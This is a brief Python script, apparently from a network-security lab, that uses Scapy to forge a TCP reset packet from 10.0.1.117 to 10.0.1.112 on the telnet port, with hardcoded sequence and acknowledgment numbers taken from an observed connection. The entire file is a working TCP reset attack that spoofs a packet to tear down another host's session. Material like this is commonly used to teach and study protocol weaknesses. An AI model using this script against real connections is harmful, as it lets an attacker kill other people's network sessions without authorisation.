#!/usr/bin/python
from scapy.all import *

ip = IP(src="10.0.1.117", dst="10.0.1.112")
# ports pulled from "netstat -na"
tcp = TCP(sport=56700, dport=23, flags="R", seq=1909695550, ack=4222527046)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)